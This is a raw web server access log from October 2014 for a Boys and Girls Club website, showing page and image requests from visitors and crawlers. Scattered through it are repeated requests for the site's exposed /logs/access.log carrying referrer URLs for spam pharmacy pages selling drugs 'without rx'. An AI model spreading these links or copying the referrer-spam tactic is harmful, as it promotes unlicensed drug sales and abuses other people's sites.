98.138.19.91 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/navbar-1-inactive-11921.png HTTP/1.1" 200 813 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/navbar-3-inactive-71437.png HTTP/1.1" 200 896 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/navbar-4-inactive-76468.png HTTP/1.1" 200 853 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/navbar-6-inactive-76187.png HTTP/1.1" 200 681 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/navbar-8-inactive-18203.png HTTP/1.1" 200 854 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/navbar-7-inactive-35843.png HTTP/1.1" 200 774 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/navbar-10-inactive-93046.png HTTP/1.1" 200 862 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/navbar-9-inactive-11281.png HTTP/1.1" 200 811 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/thumbnail-112x108.jpg HTTP/1.1" 200 5293 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:12:50:17 -0700] "GET /sitebuilder/images/minds_under_construction-105x105.jpg HTTP/1.1" 200 3781 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:19 -0700] "GET /sitebuilder/images/navbar-9-mouseOver-11375.png HTTP/1.1" 200 778 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:19 -0700] "GET /sitebuilder/images/navbar-8-mouseOver-18281.png HTTP/1.1" 200 823 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:19 -0700] "GET /sitebuilder/images/navbar-7-mouseOver-35953.png HTTP/1.1" 200 741 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:19 -0700] "GET /sitebuilder/images/navbar-6-mouseOver-76296.png HTTP/1.1" 200 640 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:12:50:19 -0700] "GET /sitebuilder/images/navbar-5-mouseOver-37390.png HTTP/1.1" 200 726 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:19 -0700] "GET /sitebuilder/images/navbar-3-mouseOver-71546.png HTTP/1.1" 200 846 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:12:50:19 -0700] "GET /sitebuilder/images/navbar-2-mouseOver-12156.png HTTP/1.1" 200 721 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:12:50:19 -0700] "GET /sitebuilder/images/navbar-1-mouseOver-12015.png HTTP/1.1" 200 762 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:12:50:21 -0700] "GET /sitebuilder/images/navbar-10-mouseOver-93125.png HTTP/1.1" 200 827 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:22 -0700] "GET /sitebuilder/images/navbar-10-mouseOver-93125.png HTTP/1.1" 200 827 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:12:50:22 -0700] "GET /sitebuilder/images/navbar-4-mouseOver-76562.png HTTP/1.1" 200 819 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:25 -0700] "GET /contactus.html HTTP/1.1" 200 2175 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:25 -0700] "GET /sitebuilder/images/navbar-10-active-93078.png HTTP/1.1" 200 857 "http://www.bgcsierrablanca.org/contactus.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:31 -0700] "GET /aboutus.html HTTP/1.1" 200 3565 "http://www.bgcsierrablanca.org/contactus.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
198.243.13.66 - - [20/Oct/2014:12:50:32 -0700] "GET /sitebuilder/images/navbar-9-active-11328.png HTTP/1.1" 200 814 "http://www.bgcsierrablanca.org/aboutus.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:12:51:48 -0700] "GET /sitebuilder/images/navbar-7-mouseOver-35953.png HTTP/1.1" 200 741 "http://www.bgcsierrablanca.org/aboutus.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:12:51:48 -0700] "GET /sitebuilder/images/navbar-3-mouseOver-71546.png HTTP/1.1" 200 846 "http://www.bgcsierrablanca.org/aboutus.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:12:51:48 -0700] "GET /sitebuilder/images/navbar-5-mouseOver-37390.png HTTP/1.1" 200 726 "http://www.bgcsierrablanca.org/aboutus.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:12:54:19 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://ldloxitane.forumcircle.com" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36" "www.bgcsierrablanca.org"
123.125.71.114 - - [20/Oct/2014:12:56:13 -0700] "GET /donate.html HTTP/1.1" 200 3376 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:13:00:31 -0700] "GET /logs/access.log HTTP/1.1" 200 81568 "http://azulfidine500mgjif.forumcircle.com" "Opera/9.80 (Windows NT 6.1; Win64; x64) Presto/2.12.388 Version/12.16" "www.bgcsierrablanca.org"
208.115.111.66 - - [20/Oct/2014:13:10:22 -0700] "GET /robots.txt HTTP/1.1" 200 46 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:13:12:43 -0700] "GET /logs/access.log HTTP/1.0" 200 82004 "http://order-mometasone-5mg-online-safely.page.tl" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:13:18:36 -0700] "GET /logs/access.log HTTP/1.0" 200 82284 "http://47imebendazole.over-blog.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:13:24:31 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://buysalbutamolonlineunitedkingdom.soup.io" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36" "www.bgcsierrablanca.org"
123.125.71.17 - - [20/Oct/2014:13:26:30 -0700] "GET /employment.html HTTP/1.1" 200 2602 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:13:30:27 -0700] "GET /logs/access.log HTTP/1.1" 200 83023 "http://order-wellbutrin-sr-150mg-safely.soup.io" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:13:36:18 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://captopril-buy-without-rx.soup.io" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:13:48:09 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://order-atomoxetine-2014.over-blog.com" "Mozilla/5.0 (Windows NT 5.1; rv:26.0) Gecko/20100101 Firefox/26.0" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:13:54:14 -0700] "GET /logs/access.log HTTP/1.0" 200 83782 "http://lincomycin-500mg-buy-safely.snack.ws" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36 OPR/20.0.1387.64" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:14:00:11 -0700] "GET /logs/access.log HTTP/1.0" 200 84073 "http://buyalbendazole400mgbrazil.soup.io" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safari/537.36 OPR/19.0.1326.59" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:14:06:03 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://buy-wellbutrin-sr-150mg-cheap.soup.io" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:08:58 -0700] "GET / HTTP/1.1" 500 2335 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:09:58 -0700] "GET / HTTP/1.1" 200 2368 "http://search.aol.com/aol/search?q=Boys%20and%20Girls%20Club%20Sierra%20Blanca&s_it=keyword_rollover&ie=UTF-8&VR=3430" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:09:58 -0700] "GET /sitebuilder/images/navbar-1-inactive-11921.png HTTP/1.1" 200 813 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:14:09:58 -0700] "GET /sitebuilder/images/navbar-3-inactive-71437.png HTTP/1.1" 200 896 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:14:09:58 -0700] "GET /sitebuilder/images/navbar-5-inactive-37281.png HTTP/1.1" 200 753 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
75.89.118.49 - - [20/Oct/2014:14:09:58 -0700] "GET /sitebuilder/images/navbar-0-active-82156.png HTTP/1.1" 200 717 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:09:58 -0700] "GET /sitebuilder/images/navbar-6-inactive-76187.png HTTP/1.1" 200 681 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:09:58 -0700] "GET /sitebuilder/images/navbar-7-inactive-35843.png HTTP/1.1" 200 774 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
75.89.118.49 - - [20/Oct/2014:14:09:58 -0700] "GET /sitebuilder/images/navbar-8-inactive-18203.png HTTP/1.1" 200 854 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:14:09:58 -0700] "GET /sitebuilder/images/navbar-9-inactive-11281.png HTTP/1.1" 200 811 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:14:09:58 -0700] "GET /sitebuilder/images/poster1-center-001-165x104.jpg HTTP/1.1" 200 5971 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
75.89.118.49 - - [20/Oct/2014:14:09:59 -0700] "GET /sitebuilder/images/minds_under_construction-105x105.jpg HTTP/1.1" 200 3781 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:14:10:31 -0700] "GET /sitebuilder/images/navbar-1-mouseOver-12015.png HTTP/1.1" 200 762 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:10:31 -0700] "GET /sitebuilder/images/navbar-3-mouseOver-71546.png HTTP/1.1" 200 846 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:10:31 -0700] "GET /sitebuilder/images/navbar-8-mouseOver-18281.png HTTP/1.1" 200 823 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:10:31 -0700] "GET /sitebuilder/images/navbar-10-mouseOver-93125.png HTTP/1.1" 200 827 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:10:31 -0700] "GET /sitebuilder/images/navbar-2-mouseOver-12156.png HTTP/1.1" 200 721 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:14:10:31 -0700] "GET /sitebuilder/images/navbar-6-mouseOver-76296.png HTTP/1.1" 200 640 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:14:10:33 -0700] "GET /sitebuilder/images/navbar-9-mouseOver-11375.png HTTP/1.1" 200 778 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:14:10:33 -0700] "GET /sitebuilder/images/navbar-5-mouseOver-37390.png HTTP/1.1" 200 726 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:14:10:39 -0700] "GET /donate.html HTTP/1.1" 200 3376 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:10:40 -0700] "GET /sitebuilder/images/navbar-0-inactive-82109.png HTTP/1.1" 200 722 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:10:40 -0700] "GET /sitebuilder/images/navbar-2-active-12093.png HTTP/1.1" 200 761 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:14:10:40 -0700] "GET /sitebuilder/images/gun_club-210x180.jpg HTTP/1.1" 200 14755 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:14:10:40 -0700] "GET /images/Group_of_Kids_jpg.jpg HTTP/1.1" 200 4434 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.151 - - [20/Oct/2014:14:10:40 -0700] "GET /sitebuilder/images/Homework_Help_jpg-160x90.jpg HTTP/1.1" 200 3696 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.90 - - [20/Oct/2014:14:10:40 -0700] "GET /clipart/buttons/paypal/donate/x-click-but21.gif HTTP/1.1" 200 574 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:14:10:40 -0700] "GET /images/Shows_Off_Her_Card_jpg.jpg HTTP/1.1" 200 5327 "http://www.bgcsierrablanca.org/donate.html" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.0 AOL/9.7 AOLBuild/4343.3044.US Safari/537.1" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:14:12:04 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://wfurazolidone100mg.aircus.com" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.91 - - [20/Oct/2014:14:18:04 -0700] "GET /logs/access.log HTTP/1.1" 500 5155 "http://orderkeflexwholesale.soup.io" "Mozilla/5.0 (Windows NT 6.1; rv:26.0) Gecko/20100101 Firefox/26.0" "www.bgcsierrablanca.org"
31.184.238.152 - - [20/Oct/2014:14:24:20 -0700] "GET /logs/access.log HTTP/1.0" 200 93924 "http://buythyroxine50mgonlinequickshipping.soup.io" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.12785 YaBrowser/13.12.1599.12785 Safari/537.36" "www.bgcsierrablanca.org"
98.138.19.134 - - [20/Oct/2014:14:25:19 -0700] "GET / HTTP/1.1" 500 2349 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:23 -0700] "GET / HTTP/1.1" 500 2345 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:28 -0700] "GET / HTTP/1.1" 500 2347 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:30 -0700] "GET / HTTP/1.1" 500 2350 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:32 -0700] "GET / HTTP/1.1" 500 2349 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:33 -0700] "GET / HTTP/1.1" 500 2349 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:34 -0700] "GET / HTTP/1.1" 500 2349 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:35 -0700] "GET / HTTP/1.1" 500 2352 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:36 -0700] "GET / HTTP/1.1" 500 2351 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:36 -0700] "GET / HTTP/1.1" 500 2351 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:37 -0700] "GET / HTTP/1.1" 500 2344 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:38 -0700] "GET / HTTP/1.1" 500 2350 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:39 -0700] "GET / HTTP/1.1" 500 2345 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
98.138.19.135 - - [20/Oct/2014:14:28:39 -0700] "GET / HTTP/1.1" 500 2345 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
70.210.198.244 - - [20/Oct/2014:14:29:22 -0700] "GET /sitebuilder/images/navbar-5-inactive-37281.png HTTP/1.1" 200 753 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
70.210.198.244 - - [20/Oct/2014:14:29:22 -0700] "GET /sitebuilder/images/navbar-0-active-82156.png HTTP/1.1" 200 717 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
70.210.198.244 - - [20/Oct/2014:14:29:23 -0700] "GET /sitebuilder/images/poster1-center-001-165x104.jpg HTTP/1.1" 200 5971 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
70.210.198.244 - - [20/Oct/2014:14:29:23 -0700] "GET /sitebuilder/images/thumbnail-112x108.jpg HTTP/1.1" 200 5293 "http://www.bgcsierrablanca.org/" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)" "www.bgcsierrablanca.org"
